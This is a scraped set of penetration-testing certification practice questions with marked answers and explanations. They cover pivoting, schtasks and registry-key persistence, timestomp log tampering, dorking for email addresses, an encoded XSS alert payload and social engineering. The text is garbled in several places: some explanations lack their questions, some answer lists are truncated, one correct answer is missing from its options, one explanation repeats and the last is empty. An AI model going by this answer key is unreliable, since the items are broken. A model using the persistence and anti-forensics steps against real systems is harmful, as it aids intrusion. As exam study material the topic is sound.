Which technique is used with the ProxyChains command to allow a penetration tester to pivot to a new subnet?

- 

  VPN pivoting

- 

  Modifying routing tables

  (正確)

- 

  Port forwarding

- 

  SSH pivoting

#### 解釋

OBJ-5.3: ProxyChains is a tool that allows a penetration tester to pivot to a new subnet, but it must be combined with the modification of the penetration tester's routing tables on their machine. For example, assume that the exploited client machine is located in the 192.168.5.0/24 subnet, but you need to access a server in the 10.0.0.0/24 subnet. You would then need to "route add 10.0.0.0 255.255.255.0 1" (1 is the ID of your Meterpreter session). Then, you can run "proxychains <command>" to target the new subnet. For example, "proxychains nmap -sT -Pn -p21,23,25,80,443 10.0.0.5" would perform a Nmap scan of the targeted server in the new subnet by chaining the connections together using a proxy on the localhost.

Which of the following vulnerability scanning tools would be used to conduct a web application vulnerability assessment?

- 

  Qualys

- 

  Nessus

- 

  Nikto

  (正確)

- 

  OpenVAS

#### 解釋

OBJ-5.3: Nikto is a web application scanner that can perform comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version-specific problems on over 270 servers. While OpenVAS, Nessus, and Qualys can scan the web servers themselves for vulnerabilities, they are not the best option to conduct a web application vulnerability assessment. OpenVAS, Nessus, and Qualys are infrastructure vulnerability scanners that focus on vulnerabilities with hosts and network devices.

Evaluate the following log entry: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-29-27-f11a5abe4dff34044edd02297cc55020.png)

Based on this log entry, which of the following statements are true?

- 

  An attempted connection to the ssh service was prevented

- 

  An attempted connection to the telnet service was prevented

  (正確)

- 

  The packet was blocked outbound from the network

- 

  Packets are being blocked inbound to and outbound from the network

- 

  The packet was blocked inbound to the network

  (正確)

- 

  MAC filtering is enabled on the firewall

#### 解釋

OBJ-2.3: Firewall log formats will vary by vendors, but this example is a commonly used format from the Linux iptable firewall tool. This log starts with the date and time of the event and provides some key pieces of information. For example, the word "drop" shows the action this log entry recorded. In this case, the firewall dropped a packet due to an ACL rule being applied. You can also see that the packet was detected on the inbound connection over eth0, so we know that packets are being scanned and blocked when they are headed inbound to the network. Next, we see the MAC address of the source device of the packet, the source (SRC) IP address, and the destination (DST) IP address. Further down, we see the source (SPT) and destination ports (DPT). In this case, the DPT is 23 and is a well-known port for telnet. Based on this single log entry, we cannot tell if packets are also being blocked when they are attempting to leave the network or if they are blocking connections to the ssh service (port 22) is also being conducting.

  dion

  (正確)

- 

  Dion

  (正確)

- 

  DIon

  (正確)

#### 解釋

OBJ-5.2: The grep (global search for regular expressions and print) is one of Linux's powerful search tools. The general syntax for the grep command is "grep [options] pattern [files]. The command searches within the specified files (in this case, the Names.txt file). When the command is issued with the -i optional flag, it treats the specified pattern as case insensitive. Therefore, all uppercase and lowercase variations of the word "DION" will be presented from the file and displayed as the command output. By default, grep uses case sensitivity, so "grep DION Names.txt" would only display the output as "DION" and ignore the other variations. As a cybersecurity analyst, grep is one of your most important tools. You can use regular expressions (regex) to quickly find indicators of compromise within your log files using grep.

Which of the following is the MOST important thing to receive from the client during the planning for an engagement?

- 

  Company policies

- 

  Key management policies

- 

  Goals and objectives

  (正確)

- 

  On-site versus off-site targets

#### 解釋

OBJ-1.2: When planning an engagement, it is crucial to understand what the client's goals and objectives are. Basically, they need to answer the question, "What do I hope to achieve by conducting this penetration test?" This will allow you to better plan the engagement within the boundaries that you and the client agree upon. For example, are they conducting the penetration test due to regulatory or compliance requirements? Are they trying to determine if their employees would be tricked by a social engineering campaign? Are they trying to determine if their patch management program is effective? Each of these objectives has different methods that would be used in the engagement.

Your organization has recently been the target of a spearphishing campaign. You have identified the website associated with the link in the spearphishing emails and want to deny access to it. Which of the following techniques would be the MOST effective in this situation?

- 

  Containment

- 

  URL filter

  (正確)

- 

  Application blocklist

- 

  Quarantine

#### 解釋

OBJ-4.2: A URL filter can be used to block a website based on its website address or universal resource locator (URL). This is not a containment technique but a blocking and filtering technique. Quarantine would be used against an infected machine, and it would not be effective against trying to block access to a given website across the entire organization. An application blocklist is used to prevent an application from running, so this cannot be used to block a single malicious or suspicious website or URL.

You are conducting a penetration test against the Dion Training network. You have successfully established a foothold on an end user’s Windows 10 workstation. You entered the following code into the command line environment on the victimized workstation: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-31-07-902d63b21beb7445e11b20054f8cca9d.png)

Which of the following was performed by running entering this?

- 

  The host will run the backdoor.bat script once a day every 30 days using the SYSTEM account’s permissions

  (正確)

- 

  The backdoor.bat script will run on the host named backdr once per day for 30 days using the SYSTEM account’s permissions

- 

  The backdoor.bat script will run on the host named backdr thirty times per day using the SYSTEM account’s permission

- 

  The host will run the backdoor.bat script thirty times per day using the SYSTEM account’s permissions

#### 解釋

OBJ-3.7: The command schtasks (Task Scheduler) can be used on a Windows 10 host to create and run a task at specified times or time intervals. In this scenario, the Task Scheduler is being used to create a task named “backdr” on the currently victimized host. This task will run the backdoor.bat script each time the task is run. The task will be run once a day every 30 days (DAILY /mo 30). The task is being run with the SYSTEM account’s permissions (/ru).

Marta's organization is concerned with the vulnerability of a user's account being vulnerable for an extended period of time if their password was compromised. Which of the following controls should be configured as part of their password policy to minimize this vulnerability?

- 

  Password history

- 

  Minimum password length

- 

  Password complexity

- 

  Password expiration

  (正確)

#### 解釋

OBJ-4.2: A password expiration control in the policy would force users to change their passwords at specific time intervals. This will then locks out a user who types in the incorrect password or create an alter that the user's account has been potentially compromised. While the other options are good components of password security to prevent an overall compromise, they are not effective against the vulnerability described in this particular scenario. It states the issue is based on time. Password history is used to determine the number of unique passwords a user must use before using an old password again. The Passwords must meet complexity requirements policy setting determines whether passwords must meet a series of guidelines that are considered important for a strong password. Maximum password length creates a limit to how long the password can be, but a longer password is considered stronger against a brute force attack.

Which of the following vulnerability scans would provide the best results if you want to determine if the target's configuration settings are correct?

- 

  Credentialed scan

  (正確)

- 

  Non-credentialed scan

- 

  External scan

- 

  Internal scan

#### 解釋

OBJ-2.4: Credentialed scans log into a system and retrieve their configuration information. Therefore, it should provide you with the best results. A non-credentialed scan relies on external resources for configuration settings that can be altered or incorrect. The scanner's network location does not directly impact the ability to read the configuration information, so it would not make a difference if you conducted an external or internal scan.

A coworker sent you the following Bash script to use during an upcoming engagement for Dion Training's corporate network: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-33-57-0cd5b6a752b3d809a2b1cd6b8ede7b23.png)

During the upcoming engagement, what should you use this script to perform?

- 

  Reconnaissance

  (正確)

- 

  Debugging an exploit

- 

  Scheduling tasks

- 

  Collecting logs

#### 解釋

OBJ-5.2: This simple Bash script is only 9 lines in length, but it creates a decent reconnaissance tool. The script asks the user for the starting and ending IP addresses to scan and then performs a nmap scan on each IP address to see if ports 80 and 443 are open. It logs this information to a greppable file called tempfile and then performs some filtering as it passes the data from tempfile to tempfile1. It then cleans up the format and overwrites the original tempfile. Then, it removes the tempfile1 that was used, leaving only the tempfile. Finally, it displays the tempfile to the screen, showing only the IP addresses with clients that have either port 80 or port 443 open.

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-33-22-1584f8c2a0f7d80b86ad8242d61173c6.png)

Which of the following best describes the data structure displayed above?

- 

  Key-value pair

  (正確)

- 

  CSV

- 

  JSON

- 

  Array

#### 解釋

OBJ-5.1: A key-value pair is made of a key name and a value of that key separated by a colon(:), such as type:intrusion-set. An array is a data structure consisting of a collection of elements, each identified by at least one array index or key. JSON is an open standard data encoding format of data representation that can be used and manipulated easily with scripts. It is designed to be human-readable and machine-processable. It is based on JavaScript concepts but is entirely script and language-independent. A comma-separated value (CSV) file is a file where entries are separated by commas. CSV files were originally used as an export from spreadsheets but have since become a very popular way to import and export data.

What command could be used to list the active services from the Windows command prompt?

- 

  sc query \\servername

- 

  sc query

  (正確)

- 

  sc config

- 

  sc query type= running

#### 解釋

OBJ-2.2: Windows uses the sc query to display information about the running service. It is part of the Service Control command-line tool, known as sc. The sc config command will modify the value of a service’s entries in the registry and the Service Control Manager database. The sc query command will obtain and display information about the specified service, driver, type of service, or driver type. By entering just the sc query, the command will return the information on the active services only. By using the type=running option, only the information on the running service will be displayed. If the command sc query \\servername is used, then the remote server's active services (\\servername) will be displayed.

You are currently conducting passive reconnaissance in preparation for an upcoming penetration test against Dion Training. You want to identify any web pages that contain the term “password”, and a link to diontraining.com. Which of the following Google hacking queries should you use?

- 

  password inurl:diontraining.com

- 

  password site:diontraining.com

- 

  password link:diontraining.com

  (正確)

- 

  password inanchor:diontraining.com

#### 解釋

OBJ-2.1: The link modifier is used to search for any pages that link to the website provided and have the search term anywhere on the page. For example, password link:diontraining.com would return only page results that link to Dion Training’s website and have the text “password” anywhere on the page. The site modifier is used to search only the specified website for results that contain the search term. For example, password site:diontraining.com would return only results for the word password on pages located on the Dion Training website. The inurl modifier is used to search for any pages whose URLs include the term specified and have the search term anywhere on the page. For example, password inurl:diontraining.com would return only page results whose URLs include the text “diontraining.com” and have the text “password” somewhere on the page. The inanchor modifier is used to search for any pages whose anchor text includes the specified term and has the search term provider somewhere on the page. For example, password inanchor:diontraining.com would return only page results that contain diontraining.com in the anchor text and have the search term “password” anywhere on the page.

Your smartphone begins to receive unsolicited messages while eating lunch at the restaurant across the street from your office. What might cause this to occur?

- 

  Geotagging

- 

  Bluejacking

  (正確)

- 

  Bluesnarfing

- 

  Packet sniffing

#### 解釋

OBJ-3.2: Bluejacking sends unsolicited messages over Bluetooth to Bluetooth-enabled devices such as smartphones and tablets. On the other hand, Bluesnarfing involves taking data from a smartphone or tablet over Bluetooth without permission. Bluetooth has a limited range, so the attacker is likely within 10 meters of the victimized device. Geotagging involves embedding the geolocation coordinates into a piece of data (normally a photo or video). Packet sniffing is a passive method of collecting network traffic for follow-on analysis at a later time.

#### 解釋

OBJ-1.2: When planning an engagement, it is crucial to understand the client's goals and objectives. Basically, they need to answer the question, "What do I hope to achieve by conducting this penetration test?" This will allow you to better plan the engagement within the boundaries you and the client agree upon. For example, are they conducting the penetration test due to regulatory or compliance requirements? Are they trying to determine if a social engineering campaign would trick their employees? Are they trying to determine if their patch management program is effective? Each of these objectives has different methods that would be used in the engagement.

A new security appliance was installed on a network as part of a managed service deployment. The vendor controls the appliance, and the IT team cannot log in or configure it. The IT team is concerned about the appliance receiving the necessary updates. Which of the following mitigations should be performed to minimize the concern for the appliance and updates?

- 

  Configuration management

- 

  Automatic updates

- 

  Vulnerability scanning

  (正確)

- 

  Scan and patch the device

#### 解釋

OBJ-4.2: The best option here is vulnerability scanning as this allows the IT team to know what risks their network is taking on and where subsequent mitigations may be possible. Configuration management, automatic updates, and patching could normally be possible solutions, but these are not viable options without gaining administrative access to the appliance. Therefore, the analyst should continue to conduct vulnerability scanning of the device to understand the risks associated with it and then make recommendations to add additional compensating controls like firewall configurations, adding a WAF, providing segmentation, and other configurations outside the appliance that could minimize the vulnerabilities it presents.

Tony works for a company as a cybersecurity analyst. His company runs a website that allows public postings. Recently, users have started complaining about the website having pop-up messages asking for their username and password. Simultaneously, your security team has noticed a large increase in the number of compromised user accounts on the system. What type of attack is most likely the cause of both of these events?

- 

  Rootkit

- 

  SQL injection

- 

  Cross-site scripting

  (正確)

- 

  Cross-site request forgery

#### 解釋

OBJ-3.3: This scenario is a perfect example of the effects of a cross-site scripting (XSS) attack. If your website's HTML code does not perform input validation to remove scripts that may be entered by a user, then an attacker can create a popup window that collects passwords and uses that information to compromise other accounts further. A cross-site request forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. An XSS will allow an attacker to execute arbitrary JavaScript within the victim's browser (such as creating pop-ups). A CSRF would allow an attack to induce a victim to perform actions they do not intend to perform. A rootkit is a set of software tools that enable an unauthorized user to control a computer system without being detected. SQL injection is the placement of malicious code in SQL statements via web page input. None of the things described in this scenario would indicate a CSRF, rootkit, or SQL injection.

An ethical hacker has been hired to conduct a physical penetration test of a company. During the first day of the test, the ethical hacker dresses up like a plumber and waits in the building's main lobby until an employee goes through the main turnstile. As soon as the employee enters his access number and proceeds to go through the turnstile, the ethical hacker follows them through the access gate. What type of attack did the ethical hacker utilize to access the restricted area of the building?

- 

  Shoulder surfing

- 

  Social engineering

- 

  Tailgating

  (正確)

- 

  Spoofing

#### 解釋

OBJ-3.6: Based on the description, the ethical hacker conducted a very specialized type of social engineering attack known as tailgating. Sometimes on a certification exam, there are two correct answers, but one is more correct. This question is an example of that concept. Tailgating involves someone who lacks the proper authentication following an employee into a restricted area. Social engineering uses deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes. Shoulder surfing is a type of social engineering technique used to obtain personal identification numbers (PINs), passwords, and other confidential data by looking over the victim's shoulder. Spoofing is the act of disguising a communication from an unknown source as being from a known, trusted source.

Which of the following secure coding best practices ensures a character like < is translated into the &lt string when writing to an HTML page?

- 

  Session management

- 

  Input validation

- 

  Error handling

- 

  Output encoding

  (正確)

#### 解釋

OBJ-5.1: Output encoding involves translating special characters into some different but equivalent form that is no longer dangerous in the target interpreter, for example, translating the < character into the &lt; string when writing to an HTML page. Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering the malfunction of various downstream components. Improper error handling can introduce various security problems where detailed internal error messages such as stack traces, database dumps, and error codes are displayed to an attacker. The session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID.

Dion Consulting Group has been hired to analyze the cybersecurity model for a new videogame console system. The manufacturer's team has come up with four recommendations to prevent intellectual property theft and piracy. As the cybersecurity consultant on this project, which of the following would you recommend they implement first?

- 

  Ensure that all games require excessive storage sizes so that it is difficult for unauthorized parties to distribute

- 

  Ensure that each individual console has a unique key for decrypting individual licenses and tracking which console has purchased which game

  (正確)

- 

  Ensure that all screen capture content is visibly watermarked

- 

  Ensure that all games for the console are distributed as encrypted so that they can only be decrypted on the game console

#### 解釋

OBJ-4.2: Ensuring that each console has a unique key will allow the console manufacturer to track who has purchased which games when using digital rights management licensing. This can be achieved using a hardware root of trust, such as a TPM module in the processor. While encrypting the games during distribution will provide some security, the games could be decrypted and distributed by unauthorized parties if the encryption key were ever compromised. The recommendation of making the game arbitrarily large will frustrate both authorized and unauthorized, which could negatively impact sales, so it is a poor recommendation to implement. Visibly watermarking everything will only aggravate the user, provide a negative customer experience, and not help fight software piracy.

OBJ-3.7: A penetration tester can use the "reg add" command to cause a particular program or command to start every time the Windows machine is booted up. To achieve this, the penetration tester stores the program in the HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run and HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run registry keys. The first one will cause the program to run whenever any user logs into the machine. The second will only cause the program to start when the victimized user logs in again.

An attacker has been collecting credit card details by calling victims and using false pretexts to trick them. Which of the following types of attack is being conducted?

- 

  Whaling

- 

  Phishing

- 

  Spear phishing

- 

  Vishing

  (正確)

#### 解釋

OBJ-3.6: Vishing is a social-engineering attack where the attacker extracts information while speaking over the phone or leveraging IP-based voice messaging services (VoIP). Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals. Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. A spear phishing attack is focused on a targeted set of people, not just an indiscriminate large group of random people. Phishing is an email-based social engineering attack in which the attacker sends an email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim.

Following an engagement, the penetration testing team has generated many recommendations for additional controls and items to be purchased to prevent future recurrences. Which of the following approaches BEST describes what the organization should do next?

- 

  Immediately procure and install all of them because the adversary may attack at any time

- 

  Conduct a cost/benefit analysis of each recommendation against the company's current fiscal posture

- 

  Create a prioritized list with all of the recommendations for review, procurement, and installation

  (正確)

- 

  Contract an outside security consultant to provide an independent assessment of the network and outsource the remediation efforts

#### 解釋

OBJ-4.1: Since an engagement has just finished, it is important to act swiftly since its results are a point-in-time assessment. The organization should still take a defined and deliberate approach to choosing the proper controls and risk mitigations. Therefore, execution through a rational business management process is the best approach, including creating a prioritized list of recommendations. Once this list has been created, the organization can conduct a cost/benefit analysis of each recommendation and determine which controls and items will be implemented in the network based upon resource availability in terms of time, person-hours, and money. This process does not need to be a long-term study or filled with complexity. Instead, it should be rapidly conducted due to the probability that an attacker may compromise the network using the same vulnerabilities the penetration testing team found in their engagement.

OBJ-2.1: Nameserver (NS) records are used to list the authoritative DNS server for a particular domain. Mail Exchange (MX) records are used to provide the mail server that accepts email messages for a particular domain. Text (TXT) records are used to provide information about a resource such as a server, network, or service in human-readable form. They often contain domain verification and domain authentications for third-party tools that can send information on behalf of a domain name. Service (SRV) records are used to provide host and port information on services such as voice over IP (VoIP) and instant messaging (IM) applications.

You are conducting a social engineering attack against an organization as part of an engagement. You send a series of emails to a victim, posing as several different coworkers. In the emails, you tell the victim about this great new website for watching new movies live from their laptop for free. Each email appears to come from a different coworker and informs this person about this awesome new free service. What type of social engineering principle is being exploited here?

- 

  Scarcity

- 

  Authority

- 

  Fear

- 

  Social proof

  (正確)

#### 解釋

OBJ-3.6: Social proof relies on the fact that people want to fit in and conform. If a victim sees or believes others are performing some action, they will believe it is okay for them to do it. In this case, the victim is convinced that "everyone else" is also using this website to watch a new movie, so they decide to join in. Little do they know, the penetration testing team set up this website to collect their information or load malicious code onto their laptop for a future exploit. Fear is a visceral emotion that can motivate people to act in ways they normally would not. In this scenario, the social engineer tries to convince the victim that their actions must be taken immediately, or bad consequences might occur. This is an attempt to cause fear and anxiety in the victim to hand over their password. Authority is used to take advantage of people's willingness to act when directed to by someone with the power or right to give orders. For example, an attacker may pose as a police officer, government agent, or high-level executive to force an employee to take some form of action, whether it is ethically dubious or counter to their interests. Scarcity is used to create a fear in a person of missing out on a special deal or offer. This technique is used in advertising all the time, such as "supplies are limited," "only available for the next 4 hours", and other such artificial limitations being used.

As a cybersecurity analyst conducting vulnerability scans, you have just completed your first scan of an enterprise network comprising over 10,000 workstations. As you examine your findings, you note that you have less than 1 critical finding per 100 workstations. Which of the following statement does BEST explain these results?

- 

  The scanner was not compatible with the devices on your network

- 

  An uncredentialed scan of the network was performed

  (正確)

- 

  The scanner failed to connect with the majority of workstations

- 

  The network has an exceptionally strong security posture

#### 解釋

OBJ-2.4: Uncredentialed scans are generally unable to detect many vulnerabilities on a device. When conducting an internal assessment, you should perform an authenticated (credentialed) scan of the environment to most accurately determine the network's vulnerability posture. In most enterprise networks, if a vulnerability exists on one machine, it also exists on most other workstations since they use a common baseline or image. If the scanner failed to connect to the workstations, an error would have been generated in the report.

Dion Training is concerned with the possibility of a data breach causing a financial loss to the company. After performing a risk analysis, the COO decides to purchase data breach insurance to protect the company from an incident. Which of the following best describes the company's risk response?

- 

  Avoidance

- 

  Mitigation

- 

  Acceptance

- 

  Transference

  (正確)

#### 解釋

OBJ-4.2: Transference (or sharing) means assigning risk to a third party (such as an insurance company or a contract with a supplier that defines liabilities). Avoidance means that the company stops doing an activity that is risk-bearing. Risk mitigation is the overall process of reducing exposure to or the effects of risk factors, such as patching a vulnerable system. Acceptance means that no countermeasures are put in place either because the risk level does not justify the cost or because there will be an unavoidable delay before the countermeasures are deployed.

A technician just completed the second phase of their scans using Firewalk and the following output was displayed on their terminal: 

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-28-54-5ae6e2cef08dfef8536fd39138140dc4.png)

Based on these scan results, which of the following statements are true?

- 

  Firewall is blocking ports 21 through 23 and a service on the target is listening on port 23

- 

  A TTL response error indicates port 23 was able to make a connection to the target

- 

  Port 23 was not blocked at the firewall because the scan on port 23 passed through the filtering device

  (正確)

- 

  No response from ports 21 and 22 indicates services are not running on the target

#### 解釋

OBJ-2.3: Firewalk is a scanning tool that sends TCP or UDP packets with a TTL one greater than the targeted gateway. If the gateway allows the traffic, it will forward the packets to the next hop where they will expire and elicit an ICMP_TIME_EXCEEDED message. If the gateway host does not allow the traffic, it will likely drop the packets and no response will be sent. Therefore, if a TTL exceeded message is received, this indicates that the associated port is being filtered by a firewall and not the gateway itself.

You are planning an engagement with a new client. The organization is hosting a domain controller and a web server with a cloud service provider. The domain controller is only accessible to those directly connected to the organization’s intranet using a virtual private cloud, but the webserver is located in a screened subnet that is accessible from the Internet. Which target types BEST described these two servers?

- 

  First-party hosted

- 

  Third-party hosted

  (正確)

- 

  Internal

- 

  External

#### 解釋

OBJ-1.2: A third-party hosted target type best describes these targets since the question includes both internal (domain controller) and external (webserver) assets as part of the target scope, but both are hosted by a third-party cloud service provider and not the organization itself. Third-party hosted targets are assets hosted by a vendor, partner, or cloud service provider. First-party hosted targets are assets hosted by the client organization themselves. An external target type is an asset that can be accessed from outside of the organization. For example, if the webserver is visible on the Internet, it is considered an external target. An internal target type means that assets can be accessed from within the organization. This can either be physically or logically from within the network, and it best simulates an insider threat. This target type can also be used to simulate an external hacker who has gained credentials on the network, such as using a spear phishing attack.

While conducting a penetration test of a web application, you enter the following URL, http://test.diontraining.com/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnSSBsb3ZlIERpb24gVHJhaW5pbmcnKTwvc2NyaXB0Pg==. What type of exploit are you attempting?

- 

  SQL injection

- 

  XSS

  (正確)

- 

  XML injection

- 

  Password spraying

#### 解釋

OBJ-3.3: This is an example of a URL-based XSS (cross-site scripting) attack. A cross-site scripting attack uses a specially crafted URL that includes attack code that will cause information that users enter into their web browser to be sent to the attacker. In this example, everything from ?param onward is part of the attack. You can see the base64 encoded string of PHNjcmlwdD5hbGVydCgnSSBsb3ZlIERpb24gVHJhaW5pbmcnKTwvc2NyaXB0Pg== being used. While you could not convert it during the exam without a base64 decoder, you should be able to tell that it is not a SQL injection nor an XML injection based on your studies. It is also not an attempt to conduct password spraying by logging into different usernames with the same password. So, by process of elimination, you can determine this is an XSS attack. If you did have a base64 decoder, you would have found that the parameter being passed would translate to <script>alert('I love Dion Training')</script>, which is a simple method to cause your web browser to create a popup that displays the text "I love Dion Training." If you attempt to load this URL in your browser, it may or may not function depending on your browser's security.

You are working on a hacking challenge on a Linux server owned by Dion Training. You have already gained initial access to the server and successfully elevated your privileges to root. As part of the challenge, you must locate any sudo commands issued by a user named Terri (whose login account is terri and UID=1003). Which of the following commands would successfully display every instance of the sudo command issued by Terri on this Linux server most efficiently?

- 

  journalctl _UID=1003 | grep -e [Tt]erri | grep sudo

- 

  journalctl _UID=1003 | grep -e 1003 | grep sudo

- 

  journalctl _UID=1003 | grep -e [Tt]erri | grep -e 1003 | grep sudo

- 

  journalctl _UID=1003 | grep sudo

  (正確)

#### 解釋

OBJ-5.2: journalctl is a command for viewing logs collected by systemd. The systemd-journald service is responsible for systemd’s log collection, and it retrieves messages from the kernel, systemd services, and other sources. These logs are gathered in a central location, which makes them easy to review. If you specify the parameter of _UID=1003, you will only receive entries made under the authorities of the user with ID (UID) 1003. In this case, that is Terri. Using the piping function, we can send that list of entries into the grep command as an input and then filter the results before returning them to the screen. This command will be sufficient to see all the times that Terri has executed something as the superuser using privilege escalation. If there are too many results, we could further filter the results using regular expressions with grep using the -e flag. Since the UID of 1003 is only used by Terri, it is unnecessary to add [Tt]erri to your grep filter as the only results for UID 1003 (terri) will already be shown. So, while all four of these would produce the same results, the most efficient option to accomplish this is by entering “journalctl _UID=1003 | grep sudo” in the terminal. Don’t get afraid when you see questions like this; walk through each part of the command step by step and determine the differences. In this question, you may not have known what journalctl is, but you didn’t need to. You needed to identify which grep expression was the shortest that would still get the job done. By comparing the differences between the options presented, you could likely take your best guess and identify the right one.

Which of the following attacks would most likely be used to create an inadvertent disclosure of information from an organization's database?

- 

  Buffer overflow

- 

  Denial of service

- 

  SQL injection

  (正確)

- 

  Cross-site scripting

#### 解釋

OBJ-3.3: A SQL injection poses the most direct and more impactful threat to an organization's database. A SQL injection could allow the attacker to execute remote commands on the database server and lead to sensitive information disclosure. A buffer overflow attack attempts to overwrite the memory buffer to send additional data into adjacent memory locations. A buffer overflow attack might target a database server, but it isn't intended to disclose information directly. Instead, a buffer overflow attack may be used to gain initial access to a server and allow for other malicious code running. A denial of service targets the availability of the information by attempting to take the server offline. A cross-site scripting attack typically is focused on the user, not the server or database.

Which of the following tools provides a penetration tester with PowerShell scripts that can maintain persistence and cover their tracks?

- 

  Empire

- 

  Searchsploit

- 

  Responder

- 

  Powersploit

  (正確)

#### 解釋

OBJ-5.3: Powersploit is a series of Microsoft PowerShell scripts that pen testers can use in post-exploit scenarios. Empire (PowerShell Empire) is a post-exploitation framework for Windows devices that allows the attacker to run PowerShell agents without needing powershell.exe. It is commonly used to escalate privileges, launch other modules to capture data, extract passwords, and install persistent backdoors. Searchsploit is a tool included in the exploitdb package on Kali Linux that enables you to search the Exploit Database archive. Responder is a fake server and relay tool that is included with Kali Linux. It responds to LLMNR, NBT-NS, POP, IMAP, SMTP, and SQL queries to possibly recover sensitive information such as user names and passwords.

A recently hired security employee at a bank was asked to perform daily scans of the bank's intranet to look for unauthorized devices. The new employee decides to create a script that scans the network for unauthorized devices every morning at 2:00 am. Which programming language would work best to create this script?

- 

  C#

- 

  ASP.NET

- 

  PHP

#### 解釋

OBJ-5.2: Python is a commonly used scripting language used in cybersecurity. Python is a general-purpose programming language that can develop many different kinds of applications. It is designed to be easy to read, and the programs use fewer lines of code compared to other programming languages. The code runs in an interpreter. Python is preinstalled on many Linux distributions and can be installed on Windows. Python scripts are saved using the .py extension. PHP is used as a scripting language for web applications. C# and ASP.NET are both compiled languages, not scripting languages.

Dion Training wants to implement technology within their corporate network to BEST mitigate the risk that a zero-day virus might infect their workstations. Which of the following should be implemented FIRST?

- 

  Application allow list

  (正確)

- 

  Anti-malware solution

- 

  Host-based firewall

- 

  Intrusion detection system

#### 解釋

OBJ-4.2: Application allow list will only allow a program to execute if it is specifically listed in the approved exception list. All other programs are blocked from running. This makes it the BEST mitigation against a zero-day virus. An intrusion detection system might detect the anomalous activity created by a piece of malware, but it will only log or alert based on the activity, not prevent it. A host-based firewall may prevent a piece of malware from establishing a network connection with a remote server. Still, again, it wouldn't prevent infection or prevent it from executing. An anti-malware solution is a good investment towards improving your security. Since the threat is a zero-day virus, an anti-malware solution will not detect it using its signature database.

- 

  Tolerance to impact

#### 解釋

OBJ-1.2: The scope has a direct impact on the budgetary requirements of a penetration test. If the scope is smaller, the budget required will be lower. If the scope is larger, then the budget also needs to be larger to support it. The scope can drive the cost, but often a fixed budget is already provided by an organization. In this case, the budget will remain constant and the scope of the assessment will have to shrink to fit within the resources available.

  SOW

- 

  SLA

-

OBJ-1.1: This is the definition of a non-disclosure agreement (NDA). There may be two NDAs in use: One from the organization to the pentester and another from the pentester to the organization. The Statement of Work (SOW) is a formal document stating what will and will not be performed during a penetration test. It should also contain the assessment's size and scope and a list of the assessment's objectives. A master service agreement (MSA) is a contract reached between parties, in which the parties agree to most of the terms that will govern future transactions or future agreements. The MSA is used when a pentester will be on retainer for a multi-year contract, and an individual SOW will be issued for each assessment to define the individual scopes for each one. A service level agreement (SLA) is a contract that outlines the detailed terms under which a service is provided, including reasons the contract may be terminated.

- 

  Erasing shell history

- 

  Clearing specific event log entries

#### 解釋

OBJ-3.7: If you can modify the time that certain events are recorded, you can deceive investigators into believing a false narrative. Altering a file's MACE (modified, accessed, created, entry modified) metadata can confuse and misdirect investigators into thinking that your attack happened at a different time, or has lasted for a longer or shorter amount of time than it has. You can use the timestomp command in Meterpreter to change MACE values.

- 

  Returns no useful results for a penetration tester

- 

  Returns all web pages containing an email address affiliated with diontraining.com

  (正確)

#### 解釋

OBJ-2.1: Google interprets this statement as <anything>@diontraining.com and understands that the user is searching for email addresses since %40 is the hex code for the @ symbol. The * is a wild card character meaning that any text could be substituted for the * in the query. This type of search would provide an attacker with a list of email addresses associated with diontraining.com, which could be used as part of a spear phishing campaign. To return all web pages hosted at diontraining.com, you should use the "site:" modifier in the query. To return all web pages with the text diontraining.com, enter "diontraining.com" into the Google search bar with no modifiers to return those results.

  Cross-site scripting

- 

  Banner grabbing

  (正確)

- 

  Querying the Whois database

#### 解釋

OBJ-2.3: The analyst conducted banner grabbing. Banner grabbing is a technique used to learn information about a computer system on a network and the services running on its open ports. In the question, the command “nc test.diontraining.com 80” was used to establish a connection to a target web server using netcat, then send an HTTP request (HEAD / HTTP/1.1). The response contains information about the service running on the webserver. In this example, the server software version (Apache 2.0.46) and the operating system (Red Hat Linux). Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in a browser side script, to a different end-user. SQL injection is a code injection technique used to attack data-driven applications where malicious SQL statements are inserted into an entry field for execution, such as dumping the database contents to the attacker. A query to the WHOIS database would return information on the website owner, not the server's operating system.

During a penetration test, which of the following should you perform if your goal is to conduct a successful smishing attack?

- 

  Send a text message with a malicious link to the organization's executives

- 

  Call the CTO's assistant using a pretext to gather information about their schedule

- 

  Send targeted emails with a malicious attachment to the sales team

  Send a targeted email with a malicious attachment to the organization's CEO

#### 解釋

OBJ-3.6: Smishing (SMS phishing) is a phishing attack in which the attacker entices their victim through SMS text messages. If the messages are sent by text message, then the attack is considered smishing. Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. Spear phishing attacks focus on a targeted set of people, not just an indiscriminate large group of random people. Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals. Pretexting is a social engineering tactic where a team will communicate, whether directly or indirectly, a lie or half-truth to get someone to believe a falsehood.

Which of the following vulnerabilities is the greatest threat to data confidentiality?

- 

  phpinfo information disclosure vulnerability

- 

  HTTP TRACE/TRACK methods enabled

- 

  Web application SQL injection vulnerability

  (正確)

- 

  SSL Server with SSLv3 enabled vulnerability

#### 解釋

